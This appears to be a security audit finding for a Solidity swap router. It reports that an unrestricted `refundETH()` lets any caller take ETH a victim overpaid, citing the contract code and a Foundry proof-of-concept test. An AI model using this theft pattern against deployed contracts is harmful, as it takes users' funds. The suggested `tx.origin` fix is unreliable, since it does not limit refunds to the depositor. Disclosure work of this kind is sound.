The vulnerability is real. Here is the full trace:

**`refundETH()` has zero access control** — it unconditionally sends the entire ETH balance of the router to `msg.sender`: [1](#0-0) 

**ETH accumulates on the router** when a user sends excess `msg.value` to any payable entry point. The `pay()` function wraps only exactly `value` ETH when `token == WETH` and `nativeBalance >= value`, leaving the remainder on the contract: [2](#0-1) 

The `receive()` guard (only WETH can push ETH in) does not prevent accumulation via `msg.value` in payable swap calls: [3](#0-2) 

The intended safe pattern is to bundle swap + `refundETH()` in a single `multicall`, as the test demonstrates: [4](#0-3) 

But `exactInputSingle` is independently `payable` and callable directly — there is no enforcement that forces users into `multicall`: [5](#0-4) 

---

### Title
Unprivileged `refundETH()` drains any residual ETH left by excess `msg.value` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`PeripheryPayments.refundETH()` is a public, payable function with no caller restriction. It transfers the router's entire ETH balance to `msg.sender`. Because every swap entry point is independently `payable`, a user who sends `msg.value > amountIn` without bundling a `refundETH()` call in the same `multicall` leaves residual ETH on the router. Any third party can immediately call `refundETH()` and receive that ETH.

### Finding Description
`refundETH()` contains no `msg.sender` check, no per-depositor accounting, and no reentrancy guard relevant to the theft path. The `receive()` guard only blocks unsolicited direct ETH pushes; it does not prevent ETH from accumulating via `msg.value` in `exactInputSingle`, `exactOutputSingle`, `exactInput`, `exactOutput`, or `multicall`. Once the swap callback consumes only the required amount (wrapping exactly `amountIn` of native ETH into WETH), the surplus sits unprotected on the router until the transaction ends. Because the router is stateless between calls, any subsequent external call to `refundETH()` — including from a different EOA — drains the full balance.

### Impact Explanation
Direct theft of user ETH. A victim who sends `msg.value = 2 ether` for a 1 ether WETH swap loses 1 ether to any attacker who calls `refundETH()` before the victim does. Impact is proportional to the excess ETH sent; there is no floor. This satisfies the High threshold (direct loss of user principal).

### Likelihood Explanation
Moderate-to-high. Users interacting with the router via a frontend or script that calls `exactInputSingle` directly (not via `multicall`) with a rounded-up `msg.value` are vulnerable. MEV bots routinely monitor for unprotected ETH on router contracts and can back-run in the same block.

### Recommendation
Two complementary fixes:

1. **Enforce `multicall` for ETH refunds** — add a `msg.sender == tx.origin` or per-call depositor mapping so only the address that sent ETH in the current transaction can call `refundETH()`.
2. **Alternatively**, track the depositor in transient storage at the start of each payable entry point and restrict `refundETH()` to that address, clearing it after the refund.

The simplest safe pattern used by Uniswap v3 successors is to store `depositor = msg.sender` in transient storage at the top of each payable function and check it in `refundETH()`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Foundry test sketch (pseudocode — wire up pool/WETH as in SimpleRouterTestBase)
function test_attacker_steals_excess_eth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    uint128 amountIn = 1_000;
    uint256 excess   = 1 ether;

    vm.deal(victim, amountIn + excess);

    // Victim calls exactInputSingle directly (no multicall + refundETH bundle)
    vm.prank(victim);
    router.exactInputSingle{value: amountIn + excess}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: amountIn,
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // Router now holds `excess` ETH — victim forgot to bundle refundETH
    assertEq(address(router).balance, excess);

    uint256 attackerBefore = attacker.balance;

    // Attacker steals it
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance - attackerBefore, excess, "attacker stole victim ETH");
    assertEq(address(router).balance, 0);
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-80)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```
